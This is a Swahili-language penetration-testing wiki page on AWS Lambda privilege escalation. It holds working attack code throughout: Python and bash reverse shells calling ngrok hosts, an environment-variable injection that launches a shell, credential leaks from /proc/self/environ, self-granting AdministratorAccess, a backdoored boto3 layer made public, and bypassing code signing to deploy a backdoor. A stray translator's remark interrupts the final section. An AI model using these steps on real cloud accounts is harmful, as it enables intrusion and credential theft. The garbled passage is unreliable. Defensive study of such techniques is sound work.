# AWS - Lambda Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## lambda

Taarifa zaidi kuhusu lambda ziko katika:

{{#ref}}
../../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Watumiaji walio na ruhusa za **`iam:PassRole`, `lambda:CreateFunction`, na `lambda:InvokeFunction`** wanaweza kuongeza hadhi zao.\\
Wanaweza **kuunda Lambda function mpya na kuiweka IAM role iliyopo**, ikimpa function hiyo ruhusa zinazohusiana na role hiyo. Mtumiaji kisha anaweza **kuandika na kupakia msimbo kwenye Lambda function hii (kwa mfano kwa rev shell)**.\\
Mara function itakapowekwa, mtumiaji anaweza **kusababisha utekelezaji wake** kwa kuinvoke Lambda function kupitia AWS API. Njia hii inamruhusu mtumiaji kufanya kazi kwa njia isiyo ya moja kwa moja kupitia Lambda function, akifanya kazi kwa kiwango cha upatikanaji kilichopewa IAM role inayohusishwa nayo.\\

Mshambuliaji anaweza kutumia hili kupata **rev shell na kuiba token**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Unaweza pia **abuse the lambda role permissions** kutoka kwenye lambda function yenyewe.\
Ikiwa lambda role ingekuwa na permissions za kutosha, ungeweza kuitumia kukupe admin rights:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Pia inawezekana kufanya leak ya lambda's role credentials bila kuhitaji muunganisho wa nje. Hii itakuwa muhimu kwa **Network isolated Lambdas** zinazotumika kwa kazi za ndani. Ikiwa kuna security groups zisizojulikana zinazochuja reverse shells zako, kipande hiki cha code kitakuwezesha leak moja kwa moja credentials kama output ya lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Athari Inayowezekana:** Privesc ya moja kwa moja kwa role ya service ya lambda isiyobainishwa iliyotajwa.

> [!CAUTION]
> Kumbuka kwamba, hata kama inaweza kuonekana kuvutia, **`lambda:InvokeAsync`** **haiwezi** pekee yake kuruhusu kutekeleza **`aws lambda invoke-async`**; pia unahitaji `lambda:InvokeFunction`

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Kama katika tukio la awali, unaweza **kujipa ruhusa ya `lambda:InvokeFunction`** ikiwa una ruhusa ya **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Athari Inayoweza Kutokea:** Direct privesc kwa lambda service role yoyote iliyoainishwa.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Watumiaji wenye **`iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping`** ruhusa (na pengine `dynamodb:PutItem` na `dynamodb:CreateTable`) wanaweza kwa njia isiyo ya moja kwa moja **escalate privileges** hata bila `lambda:InvokeFunction`.\
Wanaweza kuunda **Lambda function** yenye msimbo hatari na kuiipa **IAM role** iliyopo.

Badala ya kuituma moja kwa moja Lambda, mtumiaji huanzisha au kutumia jedwali la DynamoDB lililopo, na kuiunganisha na Lambda kupitia event source mapping. Mipangilio hii inahakikisha Lambda function inachochewa moja kwa moja **wakati kipengee kipya kinaingizwa** kwenye jedwali, iwe ni kwa kitendo cha mtumiaji au mchakato mwingine, na hivyo kwa njia isiyo ya moja kwa moja kuitisha Lambda function na kutekeleza msimbo kwa ruhusa za IAM role iliyopitishwa.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Ikiwa DynamoDB tayari inafanya kazi katika mazingira ya AWS, mtumiaji anahitaji tu **kuanzisha event source mapping** kwa Lambda function. Hata hivyo, ikiwa DynamoDB haijatumiwa, mtumiaji lazima **kuunda jedwali jipya** lenye streaming imewezeshwa:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Sasa inawezekana **connect the Lambda function to the DynamoDB table** kwa **creating an event source mapping**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Kwa kuwa Lambda function imeunganishwa na DynamoDB stream, attacker anaweza **indirectly trigger the Lambda by activating the DynamoDB stream**. Hii inaweza kufanywa kwa **inserting an item** kwenye DynamoDB table:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Madhara Yanayowezekana:** Privesc ya moja kwa moja kwa role ya huduma ya lambda iliyotajwa.

### `lambda:AddPermission`

Mshambuliaji akiwa na ruhusa hii anaweza **kujipa (au kuwapa wengine) ruhusa yoyote** (hii inaunda resource based policies ili kutoa ufikiaji kwa rasilimali):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Athari Inayowezekana:** Privesc ya moja kwa moja kwa lambda service role inayotumiwa kwa kupewa ruhusa ya kubadilisha code na kuiendesha.

### `lambda:AddLayerVersionPermission`

Mshambuliaji mwenye ruhusa hii anaweza **kujiwekea (au kuwapa wengine) ruhusa ya `lambda:GetLayerVersion`**. Anaweza kufikia layer na kutafuta udhaifu au taarifa nyeti
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Athari Inayoweza Kutokea:** Ufikiaji unaowezekana wa taarifa nyeti.

### `lambda:UpdateFunctionCode`

Watumiaji wanaomiliki ruhusa ya **`lambda:UpdateFunctionCode`** wanaweza **kubadilisha msimbo wa Lambda function iliyopo ambayo imeunganishwa na IAM role.**\
Mvamizi anaweza **modify the code of the lambda to exfiltrate the IAM credentials**.

Ingawa mvamizi huenda hana uwezo wa moja kwa moja wa kuamsha function, ikiwa Lambda function tayari ipo na inafanya kazi, kuna uwezekano itachochewa kupitia workflows au matukio yaliyopo, na hivyo kwa njia isiyo ya moja kwa moja kurahisisha utekelezaji wa msimbo uliobadilishwa.
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Athari Inayoweza Kutokea:** Direct privesc kwa lambda service role inayotumika.

### `lambda:UpdateFunctionConfiguration`

#### RCE via env variables

Kwa ruhusa hizi inawezekana kuongeza environment variables ambazo zitasababisha Lambda kutekeleza arbitrary code. Kwa mfano, katika python inawezekana kutumia environment variables `PYTHONWARNING` na `BROWSER` kumfanya mchakato wa python utekeleze amri yoyote:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
Kwa lugha nyingine za scripting kuna env variables nyingine unazoweza kutumia. Kwa taarifa zaidi angalia sehemu ndogo za scripting languages katika:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE via Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) inaruhusu kujumuisha **code** katika lamdba function yako lakini **kuihifadhi kando**, hivyo function code inaweza kubaki ndogo na **several functions can share code**.

Ndani ya lambda unaweza kuangalia paths kutoka ambako python code inapakiwa kwa kutumia function kama ifuatayo:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Hapa ni maeneo:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Kwa mfano, library boto3 inachomwa kutoka `/var/runtime/boto3` (nafasi ya 4).

#### Utekelezaji

Inawezekana kutumia vibaya ruhusa `lambda:UpdateFunctionConfiguration` ili **kuongeza layer mpya** kwa lambda function. Ili kuendesha arbitrary code layer hii inahitaji kuwa na baadhi ya **library ambayo lambda itakayoiimport.** Ikiwa unaweza kusoma code ya lambda, unaweza kupata hili kwa urahisi; pia kumbuka inaweza kuwa lambda inatumia **layer tayari** na unaweza **kupakua** layer hiyo na **kuongeza code yako** humo.

Kwa mfano, tukichukulia kuwa lambda inatumia library boto3, hii itaunda layer ya ndani yenye toleo la mwisho la library:
```bash
pip3 install -t ./lambda_layer boto3
```
Unaweza kufungua `./lambda_layer/boto3/__init__.py` na **ongeza the backdoor katika global code** (mfano: function ya exfiltrate credentials au kupata reverse shell).

Kisha, zipi saraka hiyo `./lambda_layer` na **upload the new lambda layer** kwenye account yako (au kwenye account ya victim, lakini huenda huna permissions kwa hili).\
Kumbuka kwamba unahitaji kuunda folder ya python na kuweka libraries ndani yake ili ku-override /opt/python/boto3. Pia, layer inapaswa kuwa **compatible with the python version** inayotumika na lambda, na ikiwa utaileta kwenye account yako, inapaswa kuwa katika **same region:**
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
Sasa, fanya lambda layer iliyopakiwa **ifikike kwa akaunti yoyote**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Na ambatanisha lambda layer kwenye victim lambda function:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Hatua inayofuata itakuwa ama **kuiita function** wenyewe ikiwa tunaweza au kusubiri hadi i**itaitwa** kwa njia ya kawaida–ambayo ni njia salama zaidi.

A **njia ya kimya zaidi ya kutumia exploit hii** inaweza kupatikana katika:

{{#ref}}
../../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Potential Impact:** Privesc ya moja kwa moja kwa lambda service role iliyotumika.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Labda kwa ruhusa hizo unaweza kuunda function na kuiendesha ukiipigia URL... lakini sikuweza kupata njia ya kuijaribu, kwa hivyo nijulishe ikiwa utaweza!

### Lambda MitM

Baadhi ya lambdas zitakuwa **zikipokea taarifa nyeti kutoka kwa watumiaji katika parameters.** Ikiwa upata RCE katika moja yao, unaweza exfiltrate taarifa ambazo watumiaji wengine wanazituma, angalia katika:

{{#ref}}
../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## References

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

Ikiwa Lambda function inasimamia code signing, mshambuliaji ambaye anaweza kuondoa Code Signing Config (CSC) au kuipunguza hadi Warn anaweza kuweka code isayosainiwa kwenye function. Hii inapita ulinzi wa uadilifu bila kubadilisha IAM role ya function au triggers.

Permissions (moja kati ya):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Notes:
- Kwa Path B, hauitaji AWS Signer profile ikiwa sera ya CSC imewekwa kuwa `WARN` (unsigned artifacts zinazoruhusiwa).

Steps (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Prepare a small payload:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
Njia A) Ondoa CSC kisha sasisha code:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Njia B) Downgrade to Warn na sasisha code (kama delete haikiruhusiwi):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Nimepokea. Nitatafsiri maandishi ya Kiingereza kwenda Kiswahili kwa uwazi na ufupisho bila kupoteza taarifa, huku nikihifadhi kabisa muundo wa markdown/HTML, viungo, paths, tags, majina ya huduma (mfano: aws, gcp), maneno ya kiufundi/mitaala (mfano: code, pentesting, leak) na maneno ya kitaalamu (mfano: Workspace). Sitatafsiri au kubadilisha tags, links, refs au paths, wala sitoongeza maudhui yasiyotakiwa.
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
Athari inayoweza kutokea: Uwezo wa kusukuma na kuendesha arbitrary unsigned code kwenye function ambayo ilipaswa ku-enforce signed deployments, jambo ambalo linaweza kusababisha code execution kwa function role's permissions.

Usafishaji:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

